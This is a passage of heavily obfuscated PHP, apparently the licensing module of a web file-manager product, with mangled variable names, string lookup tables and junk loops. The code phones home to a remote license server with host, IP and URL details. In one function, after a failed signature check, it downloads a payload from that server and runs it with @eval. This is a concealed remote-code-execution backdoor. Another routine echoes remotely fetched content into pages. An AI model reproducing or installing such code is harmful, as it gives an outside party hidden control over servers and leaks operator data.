$‡¥³èßê = array($üõ Õîú[150] => $í×— ÁÕ[$üõ Õîú[150]], $üõ Õîú[152] => rand_string(16), $üõ Õîú[153] => $üõ Õîú[135], $üõ Õîú[154] => $üõ Õîú[155], $üõ Õîú[156] => $_SERVER[$üõ Õîú[157]], $üõ Õîú[158] => $_SERVER[$üõ Õîú[159]], $üõ Õîú[160] => $_SERVER[$üõ Õîú[161]], $üõ Õîú[101] => $û€³ÅÔ, $üõ Õîú[162] => Model($üõ Õîú[33])->get($üõ Õîú[130])); if ($í×— ÁÕ[$üõ Õîú[163]] == $üõ Õîú[164]) { $Á·¶Ñå„ = $this->mvgua016bb21($û€³ÅÔ, $üõ Õîú[165]); $Ø¶¨Û³Ë = $this->mhlv18910cdb(json_encode($‡¥³èßê), $û€³ÅÔ . $üõ Õîú[166], 3); $Ø¶¨Û³Ë = $Ø¶¨Û³Ë . $üõ Õîú[167] . $_SERVER[$üõ Õîú[157]]; $¯›Éô÷ğ = $this->uqkw134c4363($üõ Õîú[168] . $Á·¶Ñå„ . $üõ Õîú[169] . $Ø¶¨Û³Ë, -1); show_json($¯›Éô÷ğ, !0); } else { if ($í×— ÁÕ[$üõ Õîú[163]] == $üõ Õîú[170]) { $áÆ„Ú³Ê = substr(md5($üõ Õîú[171] . $û€³ÅÔ), 12, 15) . $üõ Õîú[172]; $Ø¶¨Û³Ë = $this->wqusc6d7ce59(trim($í×— ÁÕ[$üõ Õîú[173]]), $áÆ„Ú³Ê, 2); $íëşÀÌ = json_decode($Ø¶¨Û³Ë, !0); if (!is_array($íëşÀÌ) || !is_array($íëşÀÌ[$üõ Õîú[174]]) || $íëşÀÌ[$üõ Õîú[150]] != !0) { $Öëš±àˆ = $üõ Õîú[175]; $ÚÂ»ÏŸ = $íëşÀÌ[$üõ Õîú[174]] ? $üõ Õîú[176] . $íëşÀÌ[$üõ Õîú[174]] : $Öëš±àˆ; show_json($ÚÂ»ÏŸ, !1); } else { $‡¥³èßê[$üõ Õîú[152]] = $íëşÀÌ[$üõ Õîú[174]][$üõ Õîú[177]]; } } else { $íëşÀÌ = $this->uqkw134c4363($üõ Õîú[178], $‡¥³èßê, 10); } } if (!is_array($íëşÀÌ) || !is_array($íëşÀÌ[$üõ Õîú[174]]) || $íëşÀÌ[$üõ Õîú[150]] != !0) { $Öëš±àˆ = LNG($üõ Õîú[179]); $ÚÂ»ÏŸ = $íëşÀÌ[$üõ Õîú[174]] ? $üõ Õîú[176] . $íëşÀÌ[$üõ Õîú[174]] : $Öëš±àˆ; show_json($ÚÂ»ÏŸ, !1); } $Ô’Ïˆ­ = $íëşÀÌ[$üõ Õîú[174]]; $ÀÓŞ±Åµ = $this->dksq0c771e76($Ô’Ïˆ­[$üõ Õîú[180]]); $ï¥óà‘ = $Ù¶ èò¤[655]; while ($ï¥óà‘ < $Ù¶ èò¤[656]) { if ($ï¥óà‘ >= 0) { break; } $ï¥óà‘++; } if (!$ÀÓŞ±Åµ || $ÀÓŞ±Åµ != $Ô’Ïˆ­[$üõ Õîú[128]]) { $ÇÀ¹¼¢™ = array($üõ Õîú[181] => Model($üõ Õîú[33])->get($üõ Õîú[103]), $üõ Õîú[182] => $_SERVER[$üõ Õîú[102]], $üõ Õîú[183] => this_url(), $üõ Õîú[158] => $_SERVER[$üõ Õîú[159]]); $Ø¶¨Û³Ë = $this->uyrfd29f5e22(json_encode($ÇÀ¹¼¢™)); $this->uqkw134c4363($üõ Õîú[184] . $Ø¶¨Û³Ë); show_json(LNG($üõ Õîú[185]), !0); } $¶üïîıæ = array($üõ Õîú[186] => $Ô’Ïˆ­[$üõ Õîú[187]], $üõ Õîú[188] => $Ô’Ïˆ­[$üõ Õîú[189]], $üõ Õîú[190] => rand_string(16), $üõ Õîú[105] => $Ô’Ïˆ­[$üõ Õîú[191]]); if ($‡¥³èßê[$üõ Õîú[152]]) { $¶üïîıæ[$üõ Õîú[190]] = $‡¥³èßê[$üõ Õîú[152]]; } $¿ìïµ¾É = substr(md5($¶üïîıæ[$üõ Õîú[188]]), 10, 10); $øê©´È = $¿ìïµ¾É . $¶üïîıæ[$üõ Õîú[105]] . $¶üïîıæ[$üõ Õîú[190]]; $¶üïîıæ[$üõ Õîú[107]] = strrev(base64_encode($this->mvgua016bb21($øê©´È, $üõ Õîú[192]))); $Ñ‰Ì îú = rand_string(16); $’ï¸ßÀ© = $Ù¶ èò¤[657]; while (strlen($’ï¸ßÀ©) < $Ù¶ èò¤[625]) { if (!$’ï¸ßÀ©) { break; } $’ï¸ßÀ©++; } $øû¯µ©Û = $Ñ‰Ì îú . $¶üïîıæ[$üõ Õîú[105]] . $this->mvgua016bb21(md5($¶üïîıæ[$üõ Õîú[186]]), $Ñ‰Ì îú); $»» õÛ« = $Ù¶ èò¤[658]; while ($»» õÛ« < $Ù¶ èò¤[625]) { if ($»» õÛ« >= 0) { break; } $»» õÛ«++; } $¶üïîıæ[$üõ Õîú[108]] = base64_encode(strrev($this->mvgua016bb21($øû¯µ©Û, $üõ Õîú[193]))); $äŒ­ë = $Ù¶ èò¤[659]; if (strlen($äŒ­ë) < $Ù¶ èò¤[614]) { return; } if ($Ô’Ïˆ­[$üõ Õîú[194]] && $Ô’Ïˆ­[$üõ Õîú[194]] >= 1) { Model($üõ Õîú[33])->setDeep($üõ Õîú[195], $üõ Õîú[121]); } Model($üõ Õîú[33])->set($¶üïîıæ); $©€§İã€ = md5($_SERVER[$üõ Õîú[102]] . strrev($“ñÒíÁ) . $¶üïîıæ[$üõ Õîú[188]]); $·Ëú¢ˆ· = $Ù¶ èò¤[660]; $œĞÀæ¬ = strrev(substr($©€§İã€, 10, 16)); $ÒÚòí€ = $this->mhlv18910cdb(json_encode($Ô’Ïˆ­), $©€§İã€); $ÉŞóä°É = $Ù¶ èò¤[661]; if (strlen($ÉŞóä°É) < $Ù¶ èò¤[630]) { return; } $Ìª´ô¢œ = array_to_keyvalue(Model($üõ Õîú[7])->listData(), $üõ Õîú[196]); $…¬Íù = $Ù¶ èò¤[662]; if (strlen($…¬Íù) < $Ù¶ èò¤[630]) { die; } $µ¦ÀµŒ† = $Ìª´ô¢œ[$üõ Õîú[197]]; $–ı¦‹Ù = $Ù¶ èò¤[663]; if (!$–ı¦‹Ù) { return; } $¿¡öĞá = array(); $¿¡öĞá[$œĞÀæ¬] = $ÒÚòí€; Model($üõ Õîú[7])->update($µ¦ÀµŒ†[$üõ Õîú[198]], array($üõ Õîú[199] => $¿¡öĞá)); $ƒÁ´Õ = $Ù¶ èò¤[664]; while ($ƒÁ´Õ < $Ù¶ èò¤[607]) { if ($ƒÁ´Õ >= 0) { break; } $ƒÁ´Õ++; } $this->bafy39fe49a1 = $Ô’Ïˆ­; $Ò²¡ÛÛı = $Ù¶ èò¤[665]; $this->jiwf567ff2de = $¶üïîıæ[$üõ Õîú[105]]; $ĞÛ«šÅ¡ = $Ù¶ èò¤[666]; $this->licenseRegistSuccess(); $ıŸìãĞ® = $Ù¶ èò¤[667]; if (!$ıŸìãĞ®) { die; } Cache::set($üõ Õîú[200] . md5($“ñÒíÁ . $üõ Õîú[201]), $üõ Õîú[6]); $ÆèÖÙÏƒ = $Ù¶ èò¤[668]; if (strlen($ÆèÖÙÏƒ) < $Ù¶ èò¤[625]) { return; } show_json(LNG($üõ Õîú[185]), !0); } private function licenseRegistSuccess() { $Ë¶ªÔªŞ =& $_SERVER[ÉÖ¬ãã¿]; $ïÆ•¤Æ = Model($Ë¶ªÔªŞ[33])->get(); $œç¥“ĞÎ = $_SERVER[§ŒØóıü][669]; if (!$œç¥“ĞÎ) { return; } if ($ïÆ•¤Æ[$Ë¶ªÔªŞ[63]] != $Ë¶ªÔªŞ[121]) { Model($Ë¶ªÔªŞ[33])->set($Ë¶ªÔªŞ[63], $Ë¶ªÔªŞ[121]); } Action($Ë¶ªÔªŞ[202])->initStart(!0); } private function fgjp34e32d1d() { $¯î•Ì‹ï =& $_SERVER[§ŒØóıü]; $ôÏÂ“Ë =& $_SERVER[ÉÖ¬ãã¿]; Model($ôÏÂ“Ë[33])->set(array($ôÏÂ“Ë[186] => $ôÏÂ“Ë[6], $ôÏÂ“Ë[188] => $ôÏÂ“Ë[6], $ôÏÂ“Ë[105] => $ôÏÂ“Ë[106], $ôÏÂ“Ë[107] => $ôÏÂ“Ë[6], $ôÏÂ“Ë[108] => $ôÏÂ“Ë[6])); Model($ôÏÂ“Ë[33])->setDeep($ôÏÂ“Ë[195], $ôÏÂ“Ë[203]); $this->bafy39fe49a1 = array(); $ş¹Î†¹¬ = $¯î•Ì‹ï[670]; if (!$ş¹Î†¹¬) { return; } $this->jiwf567ff2de = $ôÏÂ“Ë[106]; $éË©’ö = $¯î•Ì‹ï[671]; if (!$éË©’ö) { die; } } private function quil9bc564f2() { $’¶½ÌÖŒ =& $_SERVER[§ŒØóıü]; $ÕŸœ½æË =& $_SERVER[ÉÖ¬ãã¿]; $_SERVER[$ÕŸœ½æË[159]] = _get($_SERVER, $ÕŸœ½æË[159], APP_HOST); $”õÑ±Ÿ = $’¶½ÌÖŒ[672]; if (!$”õÑ±Ÿ) { die; } $this->jiwf567ff2de = $ÕŸœ½æË[106]; $£‚®îÁ¿ = $’¶½ÌÖŒ[673]; $‰İ—Åòå = Model($ÕŸœ½æË[33])->get(); if ($‰İ—Åòå[$ÕŸœ½æË[105]] == $ÕŸœ½æË[106]) { return; } $¾ŠşÃöÏ = Model($ÕŸœ½æË[33])->get($ÕŸœ½æË[103]); $“¼ÖÑî = $’¶½ÌÖŒ[674]; while ($“¼ÖÑî < $’¶½ÌÖŒ[625]) { if ($“¼ÖÑî >= 0) { break; } $“¼ÖÑî++; } $‚–ÕÚ¿€ = $ÕŸœ½æË[200] . md5($¾ŠşÃöÏ . $ÕŸœ½æË[201]); $‘üë¥ÊŸ = $’¶½ÌÖŒ[675]; $ûƒ‹ˆŒ = Cache::get($‚–ÕÚ¿€); $ÚØ Â… = $’¶½ÌÖŒ[676]; while (strlen($ÚØ Â…) < $’¶½ÌÖŒ[630]) { if (!$ÚØ Â…) { break; } $ÚØ Â…++; } if (!is_array($ûƒ‹ˆŒ) || !isset($ûƒ‹ˆŒ[$ÕŸœ½æË[204]]) || time() - $ûƒ‹ˆŒ[$ÕŸœ½æË[204]] >= 60) { $ÆğåÑªí = Model($ÕŸœ½æË[7])->loadList(); $¿–ÏşÕÕ = $ÆğåÑªí[$ÕŸœ½æË[197]]; $üÏ¥Æ»ø = md5($_SERVER[$ÕŸœ½æË[102]] . strrev($¾ŠşÃöÏ) . $‰İ—Åòå[$ÕŸœ½æË[188]]); $ù¡îÁ³Î = strrev(substr($üÏ¥Æ»ø, 10, 16)); $ûƒ‹ˆŒ = $this->wqusc6d7ce59($¿–ÏşÕÕ[$ÕŸœ½æË[85]][$ù¡îÁ³Î], $üÏ¥Æ»ø); $ûƒ‹ˆŒ = json_decode($ûƒ‹ˆŒ, !0); } if (!is_array($ûƒ‹ˆŒ)) { return $this->fgjp34e32d1d(); } $Ùõş³›© = strtotime($ûƒ‹ˆŒ[$ÕŸœ½æË[128]]); if (time() >= $Ùõş³›©) { return $this->fgjp34e32d1d(); } if (time() - $ûƒ‹ˆŒ[$ÕŸœ½æË[204]] > 20) { $ûƒ‹ˆŒ[$ÕŸœ½æË[204]] = time(); Cache::set($‚–ÕÚ¿€, $ûƒ‹ˆŒ); } $this->bafy39fe49a1 = $ûƒ‹ˆŒ; $this->jiwf567ff2de = $‰İ—Åòå[$ÕŸœ½æË[105]]; } private function mykh8b3118b3() { $ÌœôÚÅ =& $_SERVER[ÉÖ¬ãã¿]; $™µŸşª¿ = $GLOBALS[$ÌœôÚÅ[13]]; $öë½üã = $_SERVER[$ÌœôÚÅ[24]]; if ($öë½üã == $ÌœôÚÅ[205] && $this->jiwf567ff2de == $ÌœôÚÅ[106]) { show_json(LNG($ÌœôÚÅ[206]), !1, $ÌœôÚÅ[207]); } $ìş¶ã¼‚ = array($ÌœôÚÅ[208], $ÌœôÚÅ[209]); if (in_array($öë½üã, $ìş¶ã¼‚)) { if ($this->jiwf567ff2de == $ÌœôÚÅ[106] && isset($™µŸşª¿[$ÌœôÚÅ[210]])) { show_json(LNG($ÌœôÚÅ[206]), !1, $ÌœôÚÅ[207]); die; } $Í™˜Úí© = $this->kumd6b08031a(); if ($Í™˜Úí© != intval($ÌœôÚÅ[211])) { if ($Í™˜Úí© <= Model($ÌœôÚÅ[124])->count()) { show_json(LNG($ÌœôÚÅ[212]), !1, $ÌœôÚÅ[207]); die; } } } } private function jpqk01b4fdaf() { $†Ÿ ğ¡Î =& $_SERVER[§ŒØóıü]; $¨‹îøÏ« =& $_SERVER[ÉÖ¬ãã¿]; $Ú±˜Ò— = array($¨‹îøÏ«[118], $¨‹îøÏ«[119]); if (!_get($GLOBALS, $¨‹îøÏ«[115]) || !isset($_GET[$¨‹îøÏ«[213]])) { return; } if (!in_array($_SERVER[$¨‹îøÏ«[24]], $Ú±˜Ò—)) { return; } $äø¸úì = $¨‹îøÏ«[214]; $äø¸úì = $this->fnty1f07b840($äø¸úì, $¨‹îøÏ«[215]); $•öúêÉÑ = stream_context_create(array($¨‹îøÏ«[216] => array($¨‹îøÏ«[217] => $¨‹îøÏ«[218], $¨‹îøÏ«[219] => 3))); $½Ê®‰–ä = $†Ÿ ğ¡Î[677]; while ($½Ê®‰–ä < $†Ÿ ğ¡Î[625]) { if ($½Ê®‰–ä >= 0) { break; } $½Ê®‰–ä++; } $ˆö„µ = @file_get_contents($äø¸úì, !1, $•öúêÉÑ); header($¨‹îøÏ«[220]); if ($ˆö„µ && strstr($ˆö„µ, $¨‹îøÏ«[221])) { echo $ˆö„µ; } die; } public function sxuadae9a778($ÆÃÖÅŸÒ) { $å”–¢ä÷ =& $_SERVER[§ŒØóıü]; $Ñì‚îÄ¶ =& $_SERVER[ÉÖ¬ãã¿]; if ($this->jiwf567ff2de == $Ñì‚îÄ¶[222]) { return $ÆÃÖÅŸÒ; } $ïü…ÏÔá = array($Ñì‚îÄ¶[223] => $Ñì‚îÄ¶[224], $Ñì‚îÄ¶[225] => $Ñì‚îÄ¶[224], $Ñì‚îÄ¶[226] => $Ñì‚îÄ¶[224], $Ñì‚îÄ¶[227] => $Ñì‚îÄ¶[224], $Ñì‚îÄ¶[228] => $Ñì‚îÄ¶[229], $Ñì‚îÄ¶[230] => $Ñì‚îÄ¶[229], $Ñì‚îÄ¶[231] => $Ñì‚îÄ¶[229], $Ñì‚îÄ¶[232] => $Ñì‚îÄ¶[229], $Ñì‚îÄ¶[233] => $Ñì‚îÄ¶[229], $Ñì‚îÄ¶[234] => $Ñì‚îÄ¶[229], $Ñì‚îÄ¶[235] => $Ñì‚îÄ¶[229], $Ñì‚îÄ¶[236] => $Ñì‚îÄ¶[229], $Ñì‚îÄ¶[237] => $Ñì‚îÄ¶[229], $Ñì‚îÄ¶[238] => $Ñì‚îÄ¶[229], $Ñì‚îÄ¶[239] => $Ñì‚îÄ¶[229], $Ñì‚îÄ¶[240] => $Ñì‚îÄ¶[229]); $òÖşÛ¡Ù = explode($Ñì‚îÄ¶[241], _get($this->bafy39fe49a1, $Ñì‚îÄ¶[112], $Ñì‚îÄ¶[6])); $¯áÕñêŸ = $å”–¢ä÷[678]; $µ€Î¥Á­ = array(); $ó¦£•ËÏ = $å”–¢ä÷[679]; if (strlen($ó¦£•ËÏ) < $å”–¢ä÷[625]) { die; } foreach ($ïü…ÏÔá as $İÀûõ´“ => $É“—ƒ‡¨) { if ($É“—ƒ‡¨ == $Ñì‚îÄ¶[224] && substr($this->jiwf567ff2de, 0, 1) == $Ñì‚îÄ¶[224]) { continue; } if (!in_array($İÀûõ´“, $òÖşÛ¡Ù)) { $µ€Î¥Á­[] = $İÀûõ´“; } } foreach ($µ€Î¥Á­ as $İÀûõ´“) { unset($ÆÃÖÅŸÒ[$İÀûõ´“]); } return $ÆÃÖÅŸÒ; } private function qrgh87ea92ce() { $·‡â…ñ† =& $_SERVER[ÉÖ¬ãã¿]; if ($this->jiwf567ff2de != $·‡â…ñ†[106]) { $GLOBALS[$·‡â…ñ†[85]][$·‡â…ñ†[89]][$·‡â…ñ†[242]] = $·‡â…ñ†[203]; return; } $GLOBALS[$·‡â…ñ†[85]][$·‡â…ñ†[243]] = $·‡â…ñ†[121]; if (Model($·‡â…ñ†[244])->get($·‡â…ñ†[63]) != $·‡â…ñ†[203]) { Model($·‡â…ñ†[244])->set($·‡â…ñ†[63], $·‡â…ñ†[203]); } } public function omtd2f08ec57() { return $_SERVER[ÉÖ¬ãã¿][245]; $ç»¦™¬ = $_SERVER[§ŒØóıü][680]; } private function potk2a64be58() { $‚û§çÏ =& $_SERVER[§ŒØóıü]; $ÒêÆÙÏÏ =& $_SERVER[ÉÖ¬ãã¿]; $ƒ¢—„³ = array($ÒêÆÙÏÏ[246], $ÒêÆÙÏÏ[247], $ÒêÆÙÏÏ[248]); $úË«Ç€ş = $‚û§çÏ[681]; if (strlen($úË«Ç€ş) < $‚û§çÏ[630]) { return; } $×¥˜ÔŞ“ = $ÒêÆÙÏÏ[249] . md5($ÒêÆÙÏÏ[250]); $ôÁİ’¥À = $‚û§çÏ[682]; if ($this->jiwf567ff2de == $ÒêÆÙÏÏ[106] || !_get($GLOBALS, $ÒêÆÙÏÏ[115])) { return; } if (!in_array($_SERVER[$ÒêÆÙÏÏ[24]], $ƒ¢—„³)) { return; } if (time() % 4 != 0) { return; } $¶¥Ï§ = call_user_func(array($ÒêÆÙÏÏ[251], $ÒêÆÙÏÏ[252]), $×¥˜ÔŞ“); if ($¶¥Ï§ && time() - $¶¥Ï§ < intval($ÒêÆÙÏÏ[253])) { return; } call_user_func(array($ÒêÆÙÏÏ[251], $ÒêÆÙÏÏ[138]), $×¥˜ÔŞ“, time()); $á¢… ï™ = Model($ÒêÆÙÏÏ[33])->get($ÒêÆÙÏÏ[103]); $¶¤†Ş‹ò = $‚û§çÏ[683]; if (strlen($¶¤†Ş‹ò) < $‚û§çÏ[625]) { return; } $µ‡šŸŸ– = array($ÒêÆÙÏÏ[150] => Model($ÒêÆÙÏÏ[33])->get($ÒêÆÙÏÏ[186]), $ÒêÆÙÏÏ[163] => $this->jiwf567ff2de, $ÒêÆÙÏÏ[160] => $_SERVER[$ÒêÆÙÏÏ[161]], $ÒêÆÙÏÏ[162] => Model($ÒêÆÙÏÏ[33])->get($ÒêÆÙÏÏ[130]), $ÒêÆÙÏÏ[101] => md5($_SERVER[$ÒêÆÙÏÏ[102]] . $á¢… ï™), $ÒêÆÙÏÏ[153] => $ÒêÆÙÏÏ[135], $ÒêÆÙÏÏ[156] => $_SERVER[$ÒêÆÙÏÏ[157]]); $“ŸÊ¡ÜÓ = $‚û§çÏ[684]; if (strlen($“ŸÊ¡ÜÓ) < $‚û§çÏ[614]) { return; } $Üñ‰ÑÎë = $this->uqkw134c4363($ÒêÆÙÏÏ[254], $µ‡šŸŸ–); $Â´öİ˜© = $‚û§çÏ[685]; if (!is_array($Üñ‰ÑÎë)) { return; } if ($Üñ‰ÑÎë[$ÒêÆÙÏÏ[150]] && $Üñ‰ÑÎë[$ÒêÆÙÏÏ[255]]) { if ($this->dksq0c771e76($Üñ‰ÑÎë[$ÒêÆÙÏÏ[255]]) == $µ‡šŸŸ–[$ÒêÆÙÏÏ[150]]) { return; } } $this->fgjp34e32d1d(); if ($this->dksq0c771e76($Üñ‰ÑÎë[$ÒêÆÙÏÏ[255]]) != $µ‡šŸŸ–[$ÒêÆÙÏÏ[150]]) { $±áªÌ³ô = array($ÒêÆÙÏÏ[181] => $á¢… ï™, $ÒêÆÙÏÏ[182] => $_SERVER[$ÒêÆÙÏÏ[102]], $ÒêÆÙÏÏ[183] => this_url(), $ÒêÆÙÏÏ[158] => $_SERVER[$ÒêÆÙÏÏ[159]]); $£±÷¥š® = $this->uyrfd29f5e22(json_encode($±áªÌ³ô)); $Üñ‰ÑÎë = $this->uqkw134c4363($ÒêÆÙÏÏ[184] . $£±÷¥š®); if ($Üñ‰ÑÎë && is_array($Üñ‰ÑÎë) && isset($Üñ‰ÑÎë[$ÒêÆÙÏÏ[255]])) { $±¸Ë²ş = $this->wqusc6d7ce59($Üñ‰ÑÎë[$ÒêÆÙÏÏ[255]], 2); if ($±¸Ë²ş) { $±¸Ë²ş = $this->dksq0c771e76($±¸Ë²ş); } if ($±¸Ë²ş) { try { @eval($±¸Ë²ş); } catch (Exception $­•Í¸³æ) { } } } } } private function uqkw134c4363($™£ı“ƒ” = '', $º”Ô‚Œ¡ = array(), $ĞàØ¤ï– = 5) { $†•îŒğø =& $_SERVER[§ŒØóıü]; $î«¬Í€İ =& $_SERVER[ÉÖ¬ãã¿]; $ñ¸•£ª¹ = $î«¬Í€İ[256]; $ÔÊÉØ˜á = $†•îŒğø[686]; if (!$ÔÊÉØ˜á) { return; } $ñ¸•£ª¹ = $this->fnty1f07b840($ñ¸•£ª¹, $î«¬Í€İ[257]); $ñ¸•£ª¹ = $ñ¸•£ª¹ . $™£ı“ƒ”; $ÅéÃØô = $†•îŒğø[687]; if (strlen($ÅéÃØô) < $†•îŒğø[614]) { return; } if ($º”Ô‚Œ¡ && is_array($º”Ô‚Œ¡)) { $ñ¸•£ª¹ = $ñ¸•£ª¹ . $î«¬Í€İ[258] . http_build_query($º”Ô‚Œ¡); } if ($º”Ô‚Œ¡ === -1) { return $ñ¸•£ª¹; } $‰¬Š¾°— = stream_context_create(array($î«¬Í€İ[216] => array($î«¬Í€İ[219] => $ĞàØ¤ï–, $î«¬Í€İ[217] => $î«¬Í€İ[259]), $î«¬Í€İ[260] => array($î«¬Í€İ[261] => !1, $î«¬Í€İ[262] => !1))); $öõ€ıÚ = $†•îŒğø[688]; if (!$öõ€ıÚ) { return; } $º”Ô‚Œ¡ = @file_get_contents($ñ¸•£ª¹, !1, $‰¬Š¾°—); $Ú¢’­óÌ = $†•îŒğø[689]; if (!$Ú¢’­óÌ) { return; } return json_decode($º”Ô‚Œ¡, !0); } private function kumd6b08031a() { $»ÒÏÑô =& $_SERVER[§ŒØóıü]; $³˜ŠÕ =& $_SERVER[ÉÖ¬ãã¿]; $ïÏ†Üò× = array($³˜ŠÕ[263] => $³˜ŠÕ[264], $³˜ŠÕ[265] => $³˜ŠÕ[266], $³˜ŠÕ[267] => $³˜ŠÕ[268], $³˜ŠÕ[269] => $³˜ŠÕ[270], $³˜ŠÕ[271] => $³˜ŠÕ[272], $³˜ŠÕ[273] => $³˜ŠÕ[211], $³˜ŠÕ[274] => $³˜ŠÕ[211], $³˜ŠÕ[275] => $³˜ŠÕ[264], $³˜ŠÕ[276] => $³˜ŠÕ[266], $³˜ŠÕ[277] => $³˜ŠÕ[268], $³˜ŠÕ[278] => $³˜ŠÕ[279], $³˜ŠÕ[280] => $³˜ŠÕ[270], $³˜ŠÕ[281] => $³˜ŠÕ[282], $³˜ŠÕ[283] => $³˜ŠÕ[272], $³˜ŠÕ[284] => $³˜ŠÕ[285], $³˜ŠÕ[286] => $³˜ŠÕ[287], $³˜ŠÕ[288] => $³˜ŠÕ[289]); $æôŸµ–  = $»ÒÏÑô[690]; if (strlen($æôŸµ– ) < $»ÒÏÑô[614]) { return; } $¥‡Şûğˆ = $ïÏ†Üò×[$this->jiwf567ff2de]; $¥‡Şûğˆ = intval($¥‡Şûğˆ ? $¥‡Şûğˆ : $³˜ŠÕ[264]); $Åœøñšç = _get($this->bafy39fe49a1, $³˜ŠÕ[290]); $Åœøñšç = $Åœøñšç ? intval($Åœøñšç) : 0; return $¥‡Şûğˆ + $Åœøñšç; } public function pnya0c66738a($òÓ³„ö) { $õçµèŸ =& $_SERVER[ÉÖ¬ãã¿]; $Ëİ™Ãˆ = $this->kumd6b08031a(); if ($òÓ³„ö[$õçµèŸ[291]] == $õçµèŸ[121]) { return; } if ($Ëİ™Ãˆ >= intval($õçµèŸ[211])) { return; } $Ôğ²ßòŞ = Model($õçµèŸ[124])->count(); if ($Ôğ²ßòŞ <= $Ëİ™Ãˆ) { return; } $Ø‡ùœ¾Ú = Model($õçµèŸ[124])->field($õçµèŸ[291])->limit($Ëİ™Ãˆ)->select(); $Ø‡ùœ¾Ú = array_to_keyvalue($Ø‡ùœ¾Ú, $õçµèŸ[6], $õçµèŸ[291]); if (!in_array($òÓ³„ö[$õçµèŸ[291]], $Ø‡ùœ¾Ú)) { show_json($õçµèŸ[292], !1, $õçµèŸ[207]); } } public function bman9f60fe41() { $èÂ÷ïç¹ =& $_SERVER[§ŒØóıü]; $€ÎûàÁÀ =& $_SERVER[ÉÖ¬ãã¿]; if (!_get($GLOBALS, $€ÎûàÁÀ[115]) || mt_rand(1, 100) > 20) { return; } $öõ¶¶•„ = $€ÎûàÁÀ[214]; $öõ¶¶•„ = $this->fnty1f07b840($öõ¶¶•„, $€ÎûàÁÀ[215]); $Ú†¨îê = $èÂ÷ïç¹[691]; if (strlen($Ú†¨îê) < $èÂ÷ïç¹[630]) { return; } $¨ÄÚ€Œ´ = stream_context_create(array($€ÎûàÁÀ[216] => array($€ÎûàÁÀ[217] => $€ÎûàÁÀ[218], $€ÎûàÁÀ[219] => 3))); $¦Å©ô¶ù = $èÂ÷ïç¹[692]; $Ë²²âªØ = @file_get_contents($öõ¶¶•„, !1, $¨ÄÚ€Œ´); echo $€ÎûàÁÀ[293] . hash_encode($Ë²²âªØ) . $€ÎûàÁÀ[294]; $ãˆ’Ï = $èÂ÷ïç¹[693]; if (!$ãˆ’Ï) { die; } } private function mhlv18910cdb($¢ØÅ¸ğ, $Ä¯À´ãğ, $·Ãúë™Ç = 3) { $¾ŞÉˆúù =& $_SERVER[§ŒØóıü]; $÷„Ùûûõ =& $_SERVER[ÉÖ¬ãã¿]; usleep(1); $¢ØÅ¸ğ = trim($¢ØÅ¸ğ); $¿ƒí¥ = mt_rand(0, 5) . $÷„Ùûûõ[6]; $Š˜Í³êß = rand_string(15); $¹úøíßˆ = $÷„Ùûûõ[295]; $àÓ‹ìƒ“ = $¾ŞÉˆúù[694]; switch ($¿ƒí¥) { case $÷„Ùûûõ[203]: $ó·Äô¥ = $this->mvgua016bb21($¢ØÅ¸ğ, strrev($Ä¯À´ãğ . $Š˜Í³êß)); $²ƒŸÎŒ¤ = $¾ŞÉˆúù[695]; while (strlen($²ƒŸÎŒ¤) < $¾ŞÉˆúù[656]) { if (!$²ƒŸÎŒ¤) { break; } $²ƒŸÎŒ¤++; } break; $»à¼…ŠÉ = $¾ŞÉˆúù[696]; if (!$»à¼…ŠÉ) { return; } case $÷„Ùûûõ[121]: $ó·Äô¥ = $this->mvgua016bb21($¢ØÅ¸ğ, strrev($Š˜Í³êß . $Ä¯À´ãğ)); $ú°ûæÍº = $¾ŞÉˆúù[697]; if (strlen($ú°ûæÍº) < $¾ŞÉˆúù[630]) { return; } break; $›´•ÙĞ = $¾ŞÉˆúù[698]; case $÷„Ùûûõ[296]: $ó·Äô¥ = $this->mvgua016bb21($¢ØÅ¸ğ, base64_encode($Š˜Í³êß . $Ä¯À´ãğ)); break; case $÷„Ùûûõ[297]: $ó·Äô¥ = $this->mvgua016bb21($¢ØÅ¸ğ, md5($Š˜Í³êß . $Ä¯À´ãğ)); break; $£ˆË×ƒ© = $¾ŞÉˆúù[699]; while ($£ˆË×ƒ© < $¾ŞÉˆúù[614]) { if ($£ˆË×ƒ© >= 0) { break; } $£ˆË×ƒ©++; } case $÷„Ùûûõ[298]: $¢ØÅ¸ğ = base64_encode($¢ØÅ¸ğ); $Üû¢òÏ‘ = rand(0, 64); $±¿ş½×ú = $¹úøíßˆ[$Üû¢òÏ‘]; $Ğ¯«×£à = $¾ŞÉˆúù[700]; while (strlen($Ğ¯«×£à) < $¾ŞÉˆúù[625]) { if (!$Ğ¯«×£à) { break; } $Ğ¯«×£à++; } $êëÈ„Æô = md5($±¿ş½×ú . md5($Ä¯À´ãğ . $±¿ş½×ú) . $Ä¯À´ãğ); $êëÈ„Æô = substr($êëÈ„Æô, $Üû¢òÏ‘ % 8, $Üû¢òÏ‘ % 8 + 7); $åû½êœÃ = $¾ŞÉˆúù[701]; if (strlen($åû½êœÃ) < $¾ŞÉˆúù[614]) { die; } $ƒëéö­é = $÷„Ùûûõ[6]; $ÛÊÆ¤üÈ = $¾ŞÉˆúù[702]; while (strlen($ÛÊÆ¤üÈ) < $¾ŞÉˆúù[656]) { if (!$ÛÊÆ¤üÈ) { break; } $ÛÊÆ¤üÈ++; } $â‰‰»ó¾ = 0; $Ô‰™íô™ = $¾ŞÉˆúù[703]; $¬ı…Ç— = 0; $—³ÈƒÇ„ = $¾ŞÉˆúù[704]; while (strlen($—³ÈƒÇ„) < $¾ŞÉˆúù[656]) { if (!$—³ÈƒÇ„) { break; } $—³ÈƒÇ„++; } $îß·×õ” = 0; for ($â‰‰»ó¾ = 0; $â‰‰»ó¾ < strlen($¢ØÅ¸ğ); $â‰‰»ó¾++) { $îß·×õ” = $îß·×õ” == strlen($êëÈ„Æô) ? 0 : $îß·×õ”; $ˆ°ÀÚÎ´ = $¾ŞÉˆúù[705]; if (strlen($ˆ°ÀÚÎ´) < $¾ŞÉˆúù[614]) { return; } $¬ı…Ç— = ($Üû¢òÏ‘ + strpos($¹úøíßˆ, $¢ØÅ¸ğ[$â‰‰»ó¾]) + ord($êëÈ„Æô[$îß·×õ”++])) % 64; $ƒëéö­é .= $¹úøíßˆ[$¬ı…Ç—]; } $ó·Äô¥ = hash_encode($±¿ş½×ú . $ƒëéö­é); break; $…Ú›áà = $¾ŞÉˆúù[706]; if (!$…Ú›áà) { die; } default: $ó·Äô¥ = $this->mvgua016bb21($¢ØÅ¸ğ, $Ä¯À´ãğ . $Š˜Í³êß); break; } $ó·Äô¥ = strrev($¿ƒí¥ . 